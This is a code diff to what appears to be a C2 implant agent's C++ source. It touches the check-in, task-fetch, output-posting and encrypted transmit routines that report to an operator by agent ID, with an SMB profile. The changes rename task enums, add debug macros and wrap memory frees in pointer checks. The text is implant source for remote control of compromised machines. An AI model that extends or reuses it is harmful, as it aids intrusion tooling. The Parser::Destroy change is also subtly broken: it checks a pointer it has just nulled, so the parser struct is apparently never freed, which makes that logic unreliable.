@@ -587,7 +587,7 @@ auto DECLFN Package::Checkin( VOID ) -> PACKAGE* {
     Package->Encrypt = FALSE;
 
     this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
-    this->Byte( Package, Enm::Task::Checkin );
+    this->Byte( Package, (BYTE)Action::Task::Checkin );
 
     return Package;
 }
@@ -601,7 +601,7 @@ auto DECLFN Package::PostJobs( VOID ) -> PACKAGE* {
     Package->Encrypt = FALSE;
 
     this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
-    this->Byte( Package, Enm::Task::PostReq );
+    this->Byte( Package, (BYTE)Action::Task::PostTask );
 
     return Package;
 }
@@ -617,7 +617,7 @@ auto DECLFN Package::NewTask(
     Package->Encrypt = FALSE;
 
     this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
-    this->Byte( Package, Enm::Task::GetTask );
+    this->Byte( Package, (BYTE)Action::Task::GetTask );
 
     return Package;
 }
@@ -692,21 +692,43 @@ auto DECLFN Package::Transmit(
         Success = TRUE;
     }
 
-    Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
+    KH_DBG_MSG
 
+    Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
+
+    KH_DBG_MSG
+    
     if ( Success && RecvData.Ptr && RecvData.Size ) {
+        KH_DBG_MSG
         UCHAR* DecryptBuff   = RecvData.Ptr + EncryptOffset;
         ULONG  DecryptLength = (ULONG)RecvData.Size - EncryptOffset;
 
+        if ( DecryptLength == 0 ) { 
+            KhDbg("Invalid decrypt length: %lu", DecryptLength);
+            if ( RecvData.Ptr ) hFree( RecvData.Ptr );
+            return FALSE;
+        }
+
+        KH_DBG_MSG
+
         Self->Crp->Decrypt( DecryptBuff, DecryptLength );
+
+        KH_DBG_MSG
          
         *Response = RecvData.Ptr;
         *Size     = RecvData.Size;
         
         Success = TRUE;
     } else if ( RecvData.Ptr ) {
+        KH_DBG_MSG
+        
         hFree( RecvData.Ptr );
+        
+        Success = FALSE;
+        KH_DBG_MSG
     }
+
+    KH_DBG_MSG
 
     return Success;
 }
@@ -783,7 +805,7 @@ auto DECLFN Package::SendOut(
     Package->Length = 0;
 
     this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
-    this->Byte( Package, Enm::Task::QuickOut );
+    this->Byte( Package, (BYTE)Action::Task::QuickOut );
 
     this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
     this->Int32( Package, CmdID );
@@ -826,7 +848,7 @@ auto DECLFN Package::FmtMsg(
     Package->Length = 0;
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
-    this->Byte( Package, Enm::Task::QuickMsg );
+    this->Byte( Package, (BYTE)Action::Task::QuickMsg );
 
     if ( PROFILE_C2 == PROFILE_SMB ) {
         // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
@@ -856,7 +878,7 @@ auto DECLFN Package::SendMsgA(
     Package->Length = 0;
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
-    this->Byte( Package, Enm::Task::QuickMsg );
+    this->Byte( Package, (BYTE)Action::Task::QuickMsg );
 
     if ( PROFILE_C2 == PROFILE_SMB ) {
         // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
@@ -883,7 +905,7 @@ auto DECLFN Package::SendMsgW(
     Package->Length = 0;
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
-    this->Byte( Package, Enm::Task::QuickMsg );
+    this->Byte( Package, (BYTE)Action::Task::QuickMsg );
 
     if ( PROFILE_C2 == PROFILE_SMB ) {
         // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
@@ -1007,13 +1029,18 @@ auto DECLFN Parser::Destroy(
     BOOL Success = TRUE;
 
     if ( Parser->Original ) {
-        Success = hFree( Parser->Original );
+        if ( Self->Hp->CheckPtr( Parser->Original ) ) {
+            Success = hFree( Parser->Original );
+        }
         Parser->Original = nullptr;
         Parser->Length   = 0;
     }
 
     if ( Parser ) {
-        Success = hFree( Parser );
+        if ( Self->Hp->CheckPtr( Parser->Original ) ) { 
+            Success = hFree( Parser );
+        }
+
         Parser = nullptr;
     }
 
